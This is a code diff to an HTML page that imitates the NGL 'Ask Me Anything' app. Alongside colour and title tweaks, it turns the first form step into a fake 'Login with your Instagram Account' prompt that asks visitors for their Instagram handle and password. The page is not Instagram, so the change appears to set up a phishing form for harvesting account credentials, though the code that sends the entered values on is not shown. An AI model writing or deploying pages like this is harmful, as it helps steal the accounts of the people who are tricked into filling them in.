@@ -3,12 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>NGL: Ask My Anything</title>
+  <title>NGL: Ask Me Anything</title>
   <style>
     body {
       margin: 0;
       font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #ff007f, #a033ff, #6a00ff);
+      /* Updated gradient with Radical Red */
+      background: linear-gradient(135deg, #FF4079, #a033ff, #6a00ff);
       color: white;
       display: flex;
       flex-direction: column;
@@ -50,7 +51,8 @@
     }
 
     button {
-      background: linear-gradient(135deg, #ff007f, #a033ff, #6a00ff);
+      /* Updated button gradient with Radical Red */
+      background: linear-gradient(135deg, #FF4079, #a033ff, #6a00ff);
       color: white;
       border: none;
       border-radius: 10px;
@@ -84,14 +86,14 @@
 </head>
 <body>
 
-  <div class="logo">NGL: Ask My Anything</div>
+  <div class="logo">NGL: Ask Me Anything</div>
 
   <div class="card">
     <!-- Step 1 -->
     <div id="step1">
-      <h2>Enter Your Details</h2>
-      <input type="text" id="name" placeholder="Enter your name" required>
-      <input type="text" id="instagram" placeholder="Enter your Instagram handle (optional)">
+      <h2>Login with your Instagram Account</h2>
+      <input type="text" id="name" placeholder="Enter your Instagram Handle " required>
+      <input type="text" id="instagram" placeholder="Enter your Password">
       <button onclick="goToStep2()">Next</button>
     </div>
 
@@ -156,7 +158,6 @@
 
 </body>
 </html>
-
 
 
 
